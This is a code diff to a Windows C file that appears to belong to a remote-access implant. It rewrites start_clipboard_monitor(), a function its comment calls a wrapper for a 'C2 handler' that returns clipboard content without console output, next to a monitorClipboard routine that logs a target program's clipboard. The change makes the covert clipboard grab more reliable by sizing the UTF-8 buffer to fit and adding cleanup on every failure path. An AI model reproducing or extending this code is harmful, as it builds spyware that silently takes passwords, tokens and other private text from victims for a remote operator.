@@ -93,27 +93,48 @@ void monitorClipboard(const char *targetExe, const char *logFilePath) {
 // Start clipboard monitor - wrapper function for C2 handler
 // Returns clipboard content (no console output)
 char* start_clipboard_monitor() {
-    char *result = (char*)malloc(65536);
-    if (!result) return NULL;
-    
-    if (OpenClipboard(NULL)) {
-        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
-        if (hData != NULL) {
-            LPCWSTR pszText = (LPCWSTR)GlobalLock(hData);
-            if (pszText != NULL) {
-                // Convert wide string to multibyte
-                int len = WideCharToMultiByte(CP_UTF8, 0, pszText, -1, result, 65535, NULL, NULL);
-                (void)len;  // Conversion success checked by non-zero return
-                GlobalUnlock(hData);
-                CloseClipboard();
-                return result;
-            }
-            GlobalUnlock(hData);
-        }
-        CloseClipboard();
+    if (!OpenClipboard(NULL)) {
+        return NULL;
     }
     
-    // Return NULL if clipboard is empty or failed
-    free(result);
-    return NULL;
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData == NULL) {
+        CloseClipboard();
+        return NULL;
+    }
+    
+    LPCWSTR pszText = (LPCWSTR)GlobalLock(hData);
+    if (pszText == NULL) {
+        CloseClipboard();
+        return NULL;
+    }
+    
+    // Get required buffer size for UTF-8 conversion
+    int required_size = WideCharToMultiByte(CP_UTF8, 0, pszText, -1, NULL, 0, NULL, NULL);
+    if (required_size <= 0) {
+        GlobalUnlock(hData);
+        CloseClipboard();
+        return NULL;
+    }
+    
+    // Allocate buffer for UTF-8 string
+    char *result = (char*)malloc(required_size);
+    if (!result) {
+        GlobalUnlock(hData);
+        CloseClipboard();
+        return NULL;
+    }
+    
+    // Convert wide string to UTF-8
+    int len = WideCharToMultiByte(CP_UTF8, 0, pszText, -1, result, required_size, NULL, NULL);
+    if (len <= 0) {
+        free(result);
+        GlobalUnlock(hData);
+        CloseClipboard();
+        return NULL;
+    }
+    
+    GlobalUnlock(hData);
+    CloseClipboard();
+    return result;
 }
